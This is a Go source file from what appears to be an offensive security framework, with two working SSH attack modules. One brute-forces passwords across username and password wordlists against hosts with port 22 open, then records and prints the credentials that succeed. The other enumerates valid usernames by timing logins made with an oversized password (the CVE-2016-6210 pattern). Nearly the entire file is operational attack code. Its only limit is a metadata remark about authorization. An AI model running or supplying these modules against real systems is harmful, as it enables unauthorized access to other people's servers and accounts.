package auth

import (
	"fmt"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/store"
)

// sshHosts returns the hosts to test: the configured auth.brute.host wins,
// otherwise every host with port 22 open.
func sshHosts(ctx *attacks.AttackCtx, ns string) ([]net.IP, error) {
	if raw := ctx.Conf.Get(ns, "host"); raw != "" {
		var out []net.IP
		for _, tok := range strings.FieldsFunc(raw, func(r rune) bool { return r == ',' || r == ' ' }) {
			if ip := net.ParseIP(strings.TrimSpace(tok)); ip != nil {
				out = append(out, ip)
			}
		}
		if len(out) == 0 {
			return nil, fmt.Errorf("no valid IPs in %s.host", ns)
		}
		return out, nil
	}
	var out []net.IP
	for _, h := range ctx.Store.Hosts() {
		for _, p := range h.OpenPorts() {
			if p == 22 {
				out = append(out, h.IP)
				break
			}
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no SSH hosts discovered; run service.synscan first or set %s.host", ns)
	}
	return out, nil
}

// sshAttempt tries one password for a user. It returns (ok, authError) where
// ok is true only on a successful login.
func sshAttempt(addr, user, password string, timeout time.Duration) (bool, error) {
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	client, err := ssh.Dial("tcp", addr, cfg)
	if err != nil {
		return false, err
	}
	client.Close()
	return true, nil
}

// SSHBrowse performs password brute-force testing against SSH (port 22).
// Attempts are paced and single-threaded per host so account lockouts are not
// triggered; the module reports every credential that authenticated.
type SSHBrowse struct{}

// Meta implements attacks.Module.
func (*SSHBrowse) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "auth.brute",
		Category:    "auth",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"host"},
		Description: "paced SSH password brute-force against hosts with port 22 open",
		Limitations: "slow by design to avoid lockouts; fails on key-only servers; noisy and only justified under authorization",
	}
}

// Preflight needs usernames and passwords.
func (*SSHBrowse) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if users, err := listConf(ctx, "auth.brute", "users", "wordlist"); err != nil {
		rep.AddFixable("users", err.Error())
	} else {
		rep.AddOK("users", fmt.Sprintf("%d username(s)", len(users)))
	}
	if passes, err := listConf(ctx, "auth.brute", "passwords", "wordlist"); err != nil {
		rep.AddFixable("passwords", err.Error())
	} else {
		rep.AddOK("passwords", fmt.Sprintf("%d password(s)", len(passes)))
	}
	if hosts, err := sshHosts(ctx, "auth.brute"); err != nil {
		rep.AddFixable("hosts", err.Error())
	} else {
		rep.AddOK("hosts", fmt.Sprintf("%d SSH host(s)", len(hosts)))
	}
	return rep, nil
}

// Run tests the cartesian product of users and passwords on each SSH host.
func (*SSHBrowse) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	users, err := listConf(ctx, "auth.brute", "users", "wordlist")
	if err != nil {
		return fmt.Errorf("auth.brute: %w", err)
	}
	passwords, err := listConf(ctx, "auth.brute", "passwords", "wordlist")
	if err != nil {
		return fmt.Errorf("auth.brute: %w", err)
	}
	hosts, err := sshHosts(ctx, "auth.brute")
	if err != nil {
		return fmt.Errorf("auth.brute: %w", err)
	}
	timeout := ctx.Conf.GetDuration("auth.brute", "timeout", 4*time.Second)
	delay := ctx.Conf.GetDuration("auth.brute", "delay", 300*time.Millisecond)

	var mu sync.Mutex
	var found int
	attempts := 0
	for _, ip := range hosts {
		addr := net.JoinHostPort(ip.String(), "22")
		for _, user := range users {
			for _, pass := range passwords {
				select {
				case <-ctx.Done:
					return nil
				default:
				}
				ok, err := sshAttempt(addr, user, pass, timeout)
				attempts++
				if err != nil {
					// Key-only or connection-level error: not an auth failure we
					// can brute; move to the next host.
					ctx.Emit(events.TopicLog, fmt.Sprintf("auth.brute: %s user=%s: %v", ip, user, err), nil)
					break
				}
				if ok {
					found++
					mu.Lock()
					ctx.Store.AddCred(store.Cred{
						Service:  "ssh",
						Username: user,
						Password: pass,
						Host:     ip.String(),
						VictimIP: ip.String(),
						Source:   "auth.brute",
						Time:     time.Now(),
					})
					mu.Unlock()
					ctx.Emit(events.TopicCredFound, fmt.Sprintf("auth.brute: %s accepted %s:%s", ip, user, pass), nil)
					ctx.Printf("[+] auth.brute: %s %s:%s\n", ip, user, pass)
					break // found a password for this user on this host
				}
				time.Sleep(delay)
			}
		}
	}
	ctx.SetState("auth.brute", found)
	ctx.Printf("[*] auth.brute complete: %d valid SSH credential(s) from %d attempt(s).\n", found, attempts)
	return nil
}

// Verify reports the valid credentials.
func (*SSHBrowse) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("auth.brute")
	if !ok {
		return nil, fmt.Errorf("auth.brute not run")
	}
	n, _ := v.(int)
	imp := &attacks.Impact{Summary: fmt.Sprintf("%d valid SSH credential(s) found", n)}
	for _, c := range ctx.Store.CredsBySource("auth.brute") {
		imp.Add("cred", c.Host+" "+c.Username+":"+c.Password)
	}
	return imp, nil
}

// Cleanup is a no-op.
func (*SSHBrowse) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// SSHUserEnum enumerates SSH usernames using the timing behavior of OpenSSH's
// password hashing: a server must compute SHA256(password) to return a
// password-auth failure, and it does so for valid users even when the password
// is wrong, so valid usernames produce measurably slower failures. Sending a
// deliberately huge password widens the gap (CVE-2016-6210 pattern).
type SSHUserEnum struct{}

// Meta implements attacks.Module.
func (*SSHUserEnum) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "auth.userenum",
		Category:    "auth",
		Risk:        attacks.RiskInfo,
		Targets:     []string{"host"},
		Description: "SSH username enumeration by timing the server's password-auth response",
		Limitations: "patched OpenSSH versions no longer reveal valid users this way; treat results as candidates, not proof",
	}
}

// Preflight needs users and a host.
func (*SSHUserEnum) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if users, err := listConf(ctx, "auth.userenum", "users", "wordlist"); err != nil {
		rep.AddFixable("users", err.Error())
	} else {
		rep.AddOK("users", fmt.Sprintf("%d username(s)", len(users)))
	}
	if hosts, err := sshHosts(ctx, "auth.userenum"); err != nil {
		rep.AddFixable("hosts", err.Error())
	} else {
		rep.AddOK("hosts", fmt.Sprintf("%d SSH host(s)", len(hosts)))
	}
	return rep, nil
}

// Run measures the auth-failure latency for each candidate username.
func (*SSHUserEnum) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	users, err := listConf(ctx, "auth.userenum", "users", "wordlist")
	if err != nil {
		return fmt.Errorf("auth.userenum: %w", err)
	}
	hosts, err := sshHosts(ctx, "auth.userenum")
	if err != nil {
		return fmt.Errorf("auth.userenum: %w", err)
	}
	timeout := ctx.Conf.GetDuration("auth.userenum", "timeout", 4*time.Second)
	probes := ctx.Conf.GetInt("auth.userenum", "probes", 2)
	threshold := ctx.Conf.GetDuration("auth.userenum", "threshold", 300*time.Millisecond)
	longPass := strings.Repeat("A", 512)

	type probe struct {
		user    string
		avg     time.Duration
	}
	var results []probe
	baseline := time.Duration(0)
	for _, ip := range hosts {
		addr := net.JoinHostPort(ip.String(), "22")
		for _, user := range users {
			select {
			case <-ctx.Done:
				return nil
			default:
			}
			var sum time.Duration
			measured := 0
			for i := 0; i < probes; i++ {
				start := time.Now()
				_, err := sshAttempt(addr, user, longPass, timeout)
				elapsed := time.Since(start)
				if err == nil {
					// The huge password authenticated?! Treat as confirmed.
					ctx.Emit(events.TopicCredFound, fmt.Sprintf("auth.userenum: %s authenticated with %s (trivial password)", ip, user), nil)
					results = append(results, probe{user: user, avg: elapsed})
					break
				}
				sum += elapsed
				measured++
			}
			if measured > 0 {
				avg := sum / time.Duration(measured)
				if baseline == 0 || avg < baseline {
					baseline = avg
				}
				results = append(results, probe{user: user, avg: avg})
			}
		}
	}
	sort.Slice(results, func(i, j int) bool { return results[i].avg > results[j].avg })

	var candidates []string
	for _, r := range results {
		if r.avg > baseline+threshold {
			candidates = append(candidates, r.user)
			ctx.Emit(events.TopicLog, fmt.Sprintf("auth.userenum: %s responds %v slower (candidate)", r.user, r.avg), nil)
		}
	}
	ctx.SetState("auth.userenum", candidates)
	ctx.Printf("[*] auth.userenum complete: %d candidate username(s) from %d probe(s).\n", len(candidates), len(users))
	return nil
}

// Verify reports the candidate usernames.
func (*SSHUserEnum) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("auth.userenum")
	if !ok {
		return nil, fmt.Errorf("auth.userenum not run")
	}
	candidates, _ := v.([]string)
	imp := &attacks.Impact{Summary: fmt.Sprintf("%d SSH username candidate(s)", len(candidates))}
	for _, u := range candidates {
		imp.Add("user", u)
	}
	return imp, nil
}

// Cleanup is a no-op.
func (*SSHUserEnum) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// listConf loads a list from the named comma-knob or a wordlist file.
func listConf(ctx *attacks.AttackCtx, ns, knob, fileKnob string) ([]string, error) {
	if raw := ctx.Conf.Get(ns, knob); strings.TrimSpace(raw) != "" {
		var out []string
		for _, tok := range strings.Split(raw, ",") {
			if tok = strings.TrimSpace(tok); tok != "" {
				out = append(out, tok)
			}
		}
		return out, nil
	}
	if f := ctx.Conf.Get(ns, fileKnob); f != "" {
		return readLines(f)
	}
	return nil, fmt.Errorf("set %s.%s (or %s.%s to a wordlist file)", ns, knob, ns, fileKnob)
}

var (
	_ attacks.Module = (*SSHBrowse)(nil)
	_ attacks.Module = (*SSHUserEnum)(nil)
)
